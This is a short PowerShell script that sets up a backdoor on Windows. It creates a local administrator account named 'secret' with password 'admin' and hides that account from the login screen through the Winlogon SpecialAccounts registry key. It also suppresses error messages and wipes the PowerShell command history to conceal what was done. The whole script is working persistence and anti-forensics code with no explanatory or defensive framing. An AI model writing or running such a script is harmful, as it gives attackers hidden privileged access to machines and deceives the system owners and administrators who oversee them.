# Disables error messages
$ErrorActionPreference = "SilentlyContinue"

# Define the username and password
$Username = "secret"
$Password = ConvertTo-SecureString "admin" -AsPlainText -Force

# Check if the user already exists
if (-not (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {
    # Create the user account
    New-LocalUser -Name $Username -Password $Password -FullName "System Admin" -Description "Hidden Administrator" | Out-Null
    
    # Add the user to the Administrators group
    Add-LocalGroupMember -Group "Administrators" -Member $Username

    # Hide the user from the login screen
    New-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0

    # Enable "Other users" option on login screen
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'dontdisplaylastusername' -Value 1

    # Clear command history
    Clear-Content (Get-PSReadlineOption).HistorySavePath
}
